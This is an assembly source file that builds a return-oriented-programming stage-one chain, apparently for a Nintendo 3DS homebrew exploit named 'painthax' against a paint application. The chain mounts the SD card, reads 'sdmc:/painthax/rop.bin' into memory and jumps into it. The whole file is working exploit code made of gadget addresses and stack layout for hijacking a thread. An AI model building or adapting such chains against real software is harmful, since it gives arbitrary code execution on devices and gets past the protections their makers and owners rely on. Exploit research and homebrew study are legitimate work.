.nds

.include "paint_constants.s"
.include "paint_macros.s"

BYTES_READ equ LINEAR_THREAD_TAKEOVER_PTR - (0x4 * 0x9)
CONTEXT equ LINEAR_THREAD_TAKEOVER_PTR - (0x4 * 0x8)
SDMC_STRING equ PAINT_SDMC_STRING

.create "../build/rop_stage1.bin",LINEAR_THREAD_TAKEOVER_PTR

FS_MountSdmc SDMC_STRING
FS_TryOpenFile CONTEXT, file_path, FSFILE_READ

;TryGetSize don't use macro because I want to store size directly to file_size
;and I need r4, which is poped by trygetsize
.word ROP_PAINT_POP_R0PC
  .word CONTEXT
.word ROP_PAINT_POP_R1PC
  .word file_size
.word PAINT_FS_TRYGETSIZE+0x4
  .word CONTEXT-0x28 ; r4 popped used later
  .word 0xDEADC0DE

;TryReadFile don't use macro because too big
.word ROP_PAINT_POP_R3PC
  .word ROP_PAINT_POP_R0PC
.word ROP_PAINT_LDR_R1R4_28_BLX_R3  ; load file_ptr to r1
                                    ; jump to pop r0

  .word BYTES_READ ; popped to r0
.word ROP_PAINT_POP_R2R3R4R5R6PC
    .word 0 ; offset = 0
    .word 0
    .word 0xDEADC0DE
    .word 0xDEADC0DE
    .word 0xDEADC0DE
.word PAINT_FS_TRYREADFILE+0x4
  .word 0xDEADC0DE
  .word 0xDEADC0DE
  .word 0xDEADC0DE
  .word 0xDEADC0DE
  .word 0xDEADC0DE
  .word 0xDEADC0DE
.word ROP_PAINT_POP_R4R5R6PC ; skip tryreadfile stack args (dest and size)
  .word stage1_dest ; dest
file_size:
  .word 0xDEADC0DE ; overwritten
  .word 0xDEADC0DE ; overwritten

stage1_dest: ; copy stage1 here so when readfile returns it jump to stage1

.loadtable "string16.tbl"
file_path:
  .string "sdmc:/painthax/rop.bin"

.close
